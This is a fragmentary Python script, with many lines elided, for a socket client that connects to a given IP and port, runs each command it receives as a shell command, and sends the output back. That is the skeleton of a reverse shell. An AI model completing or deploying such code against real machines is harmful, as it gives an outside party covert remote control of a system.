...
def connect(ip_address, port):
    try:
        ...
        # Corrected: Passing IP and port as a tuple
...
def wait_for_command(s):
    try:
        # Receive data from the socket (1024 bytes)
        data = s.recv(1024)
        ...
        if data.strip() == "quit":
            ...
            s.close()
            sys.exit(0)
        # If the socket connection is closed or no data is received
        elif len(data) == 0:
            print("Socket connection closed by the server.")
            return True
        else:
            # Run the received command as a shell command
            ...
            # Send back the result of the command execution
            s.send(stdout_value)
            return False
    except socket.error as err:
...
def main():
    ...
    while True:
        ...
        try:
            ...
            # Keep waiting for commands until the socket dies
            while not socket_died:
                socket_died = wait_for_command(s)

            # Close the socket if it dies
            s.close()
        except socket.error as err:
